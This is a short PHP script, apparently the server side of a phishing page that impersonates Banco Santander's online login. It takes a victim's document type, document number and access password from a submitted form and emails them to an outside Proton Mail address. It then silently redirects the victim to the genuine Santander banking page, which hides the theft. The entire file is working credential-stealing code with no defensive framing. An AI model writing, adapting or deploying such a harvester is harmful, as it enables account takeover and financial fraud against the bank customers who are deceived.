<?php
// Verifica si los datos fueron enviados mediante POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recibe los datos del formulario
    $documentType = $_POST['documentType'];
    $documentNumber = $_POST['documentNumber'];
    $password = $_POST['password'];

    // Configura la dirección de correo de destino
    $to = "margaritas97@proton.me"; // Dirección de correo donde se enviarán los datos

    // Asunto del correo
    $subject = "Nuevo inicio de sesión - Banco Santander";

    // Cuerpo del correo
    $message = "
    <html>
    <head>
        <title>Nuevo inicio de sesión</title>
    </head>
    <body>
        <h3>Detalles del inicio de sesión:</h3>
        <p><strong>Tipo de documento:</strong> $documentType</p>
        <p><strong>Número de documento:</strong> $documentNumber</p>
        <p><strong>Clave de acceso:</strong> $password</p>
    </body>
    </html>
    ";

    // Cabeceras del correo
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-Type:text/html;charset=UTF-8" . "\r\n";
    $headers .= "From: no-reply@tuwebsite.com" . "\r\n"; // Reemplaza con tu dirección de correo

    // Enviar el correo (sin mostrar nada al usuario)
    mail($to, $subject, $message, $headers);

    // Después de enviar el correo, redirige al usuario a la página de destino
    header("Location: https://www.bancosantander.es/particulares/banca-online");
    exit();
} else {
    // Si el formulario no es enviado correctamente, redirige o muestra error
    echo "Acceso no autorizado.";
}
?>
